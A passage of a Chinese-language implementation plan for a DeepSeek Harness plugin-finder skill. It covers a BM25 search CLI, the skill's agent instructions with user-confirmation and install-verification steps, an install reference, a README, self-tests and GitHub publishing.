git commit -m "feat: 四源拉取与分层刷新 CLI（降级不中断 + 缓存落盘）"
```

---

### Task 7: search.mjs CLI（新鲜度同步 + BM25 粗筛输出）

**Files:**
- Modify: `scripts/search.mjs`（追加 CLI 入口）
- Test: `tests/bm25.test.mjs`（追加一条 CLI 集成断言不必要——CLI 冒烟在 Step 4 手动）

**Interfaces:**
- Consumes: Task 2 `searchTopK`、Task 4 `INDEX_PATH`/`META_PATH`、Task 6 `buildIndex`
- Produces: CLI `node scripts/search.mjs "<需求描述>" [--top N] [--json]`

- [ ] **Step 1: 追加 CLI 实现到 search.mjs**

```js
// 追加到 scripts/search.mjs 末尾
import { pathToFileURL } from 'node:url'
import { buildIndex } from './build-index.mjs'

async function main() {
  const args = process.argv.slice(2)
  const topFlag = args.indexOf('--top')
  const top = topFlag >= 0 ? Number(args[topFlag + 1]) : 30
  const asJson = args.includes('--json')
  const query = args.find((a) => !a.startsWith('--'))
  if (!query) {
    console.error('用法: node scripts/search.mjs "<需求描述>" [--top N] [--json]')
    process.exit(1)
  }
  const { index } = await buildIndex()
  const hits = searchTopK(query, index.plugins, top)
  if (asJson) {
    console.log(JSON.stringify(hits.map((h) => ({ plugin: h.plugin, score: h.score }))))
    return
  }
  console.log(`共 ${index.plugins.length} 个候选，命中 ${hits.length} 个（数据源状态: ${JSON.stringify(index.sources)}）`)
  for (const h of hits) {
    const p = h.plugin
    console.log(`- ${p.name}  ★${p.stars}  [${p.evidence.level}]  ${p.repo}`)
    console.log(`    ${p.description.zh || p.description.en || ''}`)
  }
}

if (import.meta.url === pathToFileURL(process.argv[1] ?? '').href) {
  await main()
}
```

- [ ] **Step 2: 运行测试确认既有用例仍通过**

Run: `node --test tests/bm25.test.mjs`
Expected: `# pass 3`

- [ ] **Step 3: 真实冒烟**

Run: `node scripts/search.mjs "有没有能统计 token 用量的插件" --top 5`
Expected: 输出 5 个候选，dsh-live-stats / dsh-web-ui 等 token 相关插件应出现在前列（含名称、stars、证据级别、中文描述）。

- [ ] **Step 4: Commit**

```bash
git add scripts/search.mjs
git commit -m "feat: search CLI（查询时同步刷新索引 + BM25 粗筛输出）"
```

---

### Task 8: SKILL.md（指令层）

**Files:**
- Create: `SKILL.md`

**Interfaces:**
- Consumes: Task 7 的 CLI 用法
- Produces: 触发条件、五步流程、精排标准、安全规范、输出格式、降级策略（供 Agent 遵循）

- [ ] **Step 1: 写 SKILL.md**

```markdown
---
name: find-dsh-plugins
description: >
  用户想给 DeepSeek Harness 找插件时使用：「有没有插件能……」「帮我装个 XX」
  「生态里有什么好玩的」。语义检索四源聚合 + 安全审计 + 安装验证。
  只负责找和装；开发新插件不归本 skill 管。
---

# 找插件、装插件

四源聚合（岚叔资源站 / awesome-dsh-plugin / dsh.so / GitHub dsh-plugin topic）
统一索引，本地 BM25 粗筛 top-30 后由 Agent 做 LLM 语义精排，候选表带安全标记，
安装走 references/install-methods.md 并验证挂载。完成态只有一个：用户选中的插件
在他的 DSH 里可用。

## Step 1：检索

运行：

```sh
node <本 skill 目录>/scripts/search.mjs "<需求描述>" --top 30
```

脚本自动检查索引新鲜度并同步刷新（curated 源 30 分钟、GitHub 增量 15 分钟、全量每日）。
输出包含候选名称、stars、证据级别、中英文描述、来源。数据源全部失败时脚本会提示
索引可能过期，照常输出旧索引候选并告知用户。

## Step 2：LLM 语义精排

对 top-30 逐条比对需求意图（不是关键词，是"功能是否满足"）。优先级：

1. 语义匹配度（功能是否真的对得上）
2. evidence 级别（LISTED > CURATED > INDEXED > TOPIC；来自哪些 curated 源）
3. stars 与最近更新
4. 同功能下中文描述更完整的优先

只挑 3 个进候选表。

## Step 3：输出候选表（固定格式）

```
候选 1：<插件名>  ★<stars>  <证据级别> <风险标记>
  一句话用途：……
  为什么匹配：<1 句语义理由>
  安装：dsh plugin --profile <当前profile> add <包名/源>
候选 2：……（最多 3 个）
```

风险标记规则：脚本审计为 high、或 evidence 为拦截/拒绝级（岚叔 API 的
screening/attention 字段命中）时，必须标注「风险：<原因>」且给出替代建议。

## Step 4：用户拍板

停下来等用户选择。用户点名某插件时，用 `node <本 skill 目录>/scripts/audit.mjs <owner/repo>`
核对安全后进入 Step 5。

## Step 5：安装与验证

按 references/install-methods.md 对应小节安装。硬性规则：

- 插件有 lifecycle scripts 或审计发现写 HOME 外路径时：先停下，把原文风险说明
  展示给用户，得到明确确认才继续。
- 安装只允许 `dsh plugin --profile <当前profile> add <包名/源>`。
- 装完必须验证：web 等常驻 surface 热载后让用户确认入口出现；或运行
  `dsh --profile <profile> --dump-config` 确认插件行挂载。验证失败要排查并如实报告。

## 降级策略

- 无候选匹配：直说没找到，建议换描述词，或转 make-dsh-plugin 现写一个。
- 用户点名插件已下架/不可装：说明原因，给最接近的替代候选。
- GitHub 限流：脚本会自动回退到缓存索引并提示。
```

- [ ] **Step 2: 校验 frontmatter 可解析**

Run: `node -e "const fs=require('fs');const s=fs.readFileSync('SKILL.md','utf8');const m=s.match(/^---\n([\s\S]*?)\n---/);console.log(m?m[1]:'NO FRONTMATTER')"`
Expected: 输出包含 `name: find-dsh-plugins` 与 `description`

- [ ] **Step 3: Commit**

```bash
git add SKILL.md
git commit -m "docs: SKILL.md 指令层（五步流程 + 精排标准 + 安全规范 + 降级策略）"
```

---

### Task 9: references/install-methods.md

**Files:**
- Create: `references/install-methods.md`

**Interfaces:**
- Consumes: 无
- Produces: bundle/cordis/skill 三种装法 + 安全确认点 + 验证方法（SKILL.md Step 5 引用）

- [ ] **Step 1: 写 install-methods.md**

```markdown
# 安装方法参考

安装前先判定插件类型（读仓库的 package.json 与文件树）：

| 判定依据 | 类型 |
|---|---|
| package.json 声明 `dsh.bundle.patch` | bundle |
| 含 SKILL.md 且无 bundle 声明 | skill |
| README 明确要求写入 cordis.patch.yml，无 bundle 声明 | cordis |
| 只有旧格式（.dsh-plugin / repository 字段） | 需迁移，不能直接装 |
| 无法判定 | 需核对，不要编造安装命令 |

## bundle / 插件

```sh
dsh plugin --profile <profile> add <npm包名或github源>
```

安全确认点：

- 阅读 package.json 的 `scripts`：存在 `preinstall/install/postinstall/prepare`
  时，把脚本原文展示给用户，确认后才执行。
- 安装报 `ERR_PNPM_IGNORED_BUILDS` 时：把对应包加入 profile 的
  `pnpm-workspace.yaml` `allowBuilds` 并重新执行（这是显式的构建脚本放行，
  必须向用户说明原因）。

## skill

```sh
mkdir -p "$DSH_HOME/skills"            # 默认 ~/.dsh/skills
cp -r <来源目录>/<skill名> "$DSH_HOME/skills/"
```

验证：目录 watcher 即时加载，新会话的技能目录里出现该 skill 名。

## cordis 行（少用）

按仓库 README 指引把插件行写入 profile 的 cordis.patch.yml，重启生效。

## 装后验证

- web：热载/重启后侧边栏或设置页出现入口。
- 命令行：`dsh --profile <profile> --dump-config` 中能找到插件行。
- 验证失败排查：服务日志 `hmr/config-update-failed`、Git 源是否用了转移前的
  owner、ref/path 拼写、profile 目录 `pnpm install` 是否成功。
```

- [ ] **Step 2: Commit**

```bash
git add references/install-methods.md
git commit -m "docs: 安装方法参考（三类装法 + 安全确认点 + 装后验证）"
```

---

### Task 10: README.md（社区门面）

**Files:**
- Create: `README.md`

**Interfaces:**
- Consumes: 全部既有产物（脚本用法、四源、证据分级）
- Produces: 差异化对比表、快速开始、使用示例、数据源与更新机制、致谢、安全模型、开发贡献

- [ ] **Step 1: 写 README.md**

```markdown
# find-dsh-plugins

对话式查找 DeepSeek Harness 插件的增强版 skill —— **语义检索 × 四源聚合 × 安全审计**。

问一句"有没有能统计 token 用量的插件？"，Agent 检索四源统一索引、语义精排、
给出带安全标记的候选表，拍板后安全安装并验证。

## 与别人的差异

| 能力 | find-dsh-plugins（本仓库） | dsh-find-plugins | dsh-find-plugin | dsh-plugin-finder |
|---|---|---|---|---|
| 检索方式 | BM25 粗筛 + LLM 语义精排 | 关键词匹配 | 关键词 + stars 重排 | 注册表单源匹配 |
| 数据源 | 四源聚合（岚叔/awesome/dsh.so/GitHub topic） | GitHub topic 单源 | 2 源 | dsh.so 单源 |
| 安全审计 | evidence 分级 + 本地静态审计 | 无 | 无 | 无 |
| 形态 | skill 免重启 | skill | 插件需重启 | 插件需重启 |
| 数据新鲜度 | 分层 TTL + 查询时同步刷新 | 每次现拉 | 5 分钟缓存 | - |

## 快速开始

```sh
# 1. 复制 skill 目录（全局生效）
mkdir -p ~/.dsh/skills && cp -r find-dsh-plugins ~/.dsh/skills/

# 2. 新会话（或当前会话等待 watcher 加载）
# 3. 直接对话：
#    "有没有能统计 token 用量的插件？"
#    "帮我装个 SSH 远程运维面板"
#    "生态里有什么好玩的 UI 增强插件？"
```

## 使用示例

```
你：有没有能统计 token 用量的插件？
AI：
候选 1：dsh-web-ui（合集）  ★1416  [LISTED]
  一句话用途：DSH Web UI 插件与皮肤合集，内含实时令牌统计
  为什么匹配：需求是 token 用量统计，该合集包含 live-stats 组件且为四源精选
  安装：dsh plugin --profile web add @linxin666/dsh-web-ui-all
```

## 工作原理

```
四源（岚叔 / awesome / dsh.so / GitHub topic）
   → build-index.mjs 统一索引（分层新鲜度，查询时同步刷新）
   → search.mjs BM25 粗筛 top-30
   → Agent LLM 语义精排 → 候选表（带安全标记）
   → install-methods.md 安全安装 → 装后验证
```

## 数据源与更新机制

| 数据源 | 链接 | 说明 |
|---|---|---|
| 岚叔 DSH 插件资源站 | https://dsh.lanshuagent.com | 30 分钟自动巡检，evidence 证据分级 |
| awesome-dsh-plugin | https://github.com/awesome-dsh-plugin/awesome-dsh-plugin | 社区精选目录，中英双语描述 |
| dsh.so | https://www.dsh.so | DeepSeek Harness 开发者中心，开放数据许可 |
| GitHub dsh-plugin topic | https://github.com/topics/dsh-plugin | 生态全量仓库 |

新鲜度：curated 源 TTL 30 分钟、GitHub 增量 15 分钟、GitHub 全量每日，查询时
过期层自动同步刷新。可选定时任务（更快的常驻新鲜度）：

```sh
# launchd/cron 每小时刷新 curated 与增量层
0 * * * *  cd <skill目录> && node scripts/build-index.mjs --quiet

# 每日全量
0 3 * * *  cd <skill目录> && node scripts/build-index.mjs --refresh-full --quiet
```

## 数据源与致谢

本插件索引数据来自以下公开数据源，数据版权归各源所有，本插件仅做聚合与检索：

- 岚叔 DSH 插件资源站（https://dsh.lanshuagent.com）—— 30 分钟自动巡检与
  evidence 证据分级体系；
- awesome-dsh-plugin（https://github.com/awesome-dsh-plugin/awesome-dsh-plugin）——
  社区维护的精选目录与中英双语描述；
- dsh.so（https://www.dsh.so）—— DeepSeek Harness 开发者中心，其插件索引以
  "Free to reuse with attribution" 许可开放，特此致谢；
- GitHub dsh-plugin topic（https://github.com/topics/dsh-plugin）。

## 安全模型

- evidence 分级：LISTED（岚叔精选）> CURATED（awesome 精选）> INDEXED（dsh.so）
  > TOPIC（仅 GitHub 话题）。
- 本地静态审计：lifecycle 脚本、写 HOME 外路径、修改 shell 配置，仅在用户拍板
  前对 top-3 候选实时执行（GitHub 匿名 API 限流预算）。
- 免责声明：插件均为第三方代码，安装即信任；本 skill 只做信号提示，不构成背书。

## 开发与贡献

- 测试：`npm test`（node:test，零依赖）。
- 脚本：build-index.mjs（索引）、search.mjs（检索）、audit.mjs（审计）。
- PR 欢迎：修正数据源字段映射、补充审计规则、提升 BM25 权重。

## LICENSE

BSD-3-Clause。代码全部原创，不继承任何上游实现。
```

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "docs: README（差异化对比 + 快速开始 + 数据源致谢 + 更新引导）"
```

---

### Task 11: 端到端自测 + 本机安装验证

**Files:**
- 无新增（验证性任务）

**Interfaces:**
- Consumes: 全部产物

- [ ] **Step 1: 清缓存全量重建**

```bash
rm -rf .cache && node scripts/build-index.mjs --quiet
node -e "const i=require('./.cache/index.json'); console.log('插件数:', i.plugins.length); console.log('源状态:', JSON.stringify(i.sources))"
```

Expected: 插件数在 300-2000 之间，四个源 ok 字段为 true（个别源失败则其余源照常）。

- [ ] **Step 2: 三个典型查询冒烟**

```bash
node scripts/search.mjs "有没有能统计 token 用量的插件" --top 5
node scripts/search.mjs "帮我找一个 ssh 远程运维的工具" --top 5
node scripts/search.mjs "桌面宠物" --top 5
```

Expected: 每个查询输出 5 个候选，语义相关插件（live-stats/dsh-ssh/dsh-pet 类）应出现在前列。

- [ ] **Step 3: 安装到本机 ~/.dsh/skills/ 并验证加载**

```bash
mkdir -p ~/.dsh/skills
cp -r scripts SKILL.md references ~/.dsh/skills/find-dsh-plugins/ 2>/dev/null || \
  cp -r . ~/.dsh/skills/find-dsh-plugins
ls ~/.dsh/skills/find-dsh-plugins/
```

Expected: 目录存在，SKILL.md 在根；DSH watcher 加载后新会话技能目录出现
`find-dsh-plugins`（与既有 find-plugins 并存）。

- [ ] **Step 4: Commit（如有调试改动）**

```bash
git status --short
# 如有改动则 git add -A && git commit -m "fix: 端到端自测修正"
```

---

### Task 12: GitHub 发布

**Files:**
- 无（发布操作）

**Interfaces:**
- Consumes: 全部产物

- [ ] **Step 1: 创建远程仓库并推送**

```bash
cd ~/WorkingPlace/Coding/AI/find-dsh-plugins
gh repo create find-dsh-plugins --public --source . --push --description "对话式查找 DSH 插件的增强版 skill：语义检索 × 四源聚合 × 安全审计"
```

Expected: 仓库创建成功，本地 main 分支推送，输出仓库 URL。

- [ ] **Step 2: 打 dsh-plugin topic 标签**

```bash
gh repo edit find-dsh-plugins --add-topic dsh-plugin
gh repo view find-dsh-plugins --json topics -q .topics
```

Expected: topics 包含 `dsh-plugin`（进入四源收录视野）。

- [ ] **Step 3: 验证 README 在 GitHub 渲染**

Run: `gh repo view find-dsh-plugins --json url -q .url`，浏览器打开确认 README 正常渲染。
Expected: 差异化对比表、快速开始、致谢部分完整显示。

- [ ] **Step 4: 提交收录申请（可选后续）**

```bash
# awesome-dsh-plugin 有收录流程（提交 PR 到其仓库）
# dsh.so 与岚叔站点如有开放收录入口则提交
# 本步为后续维护项，不在本计划内强制完成
```
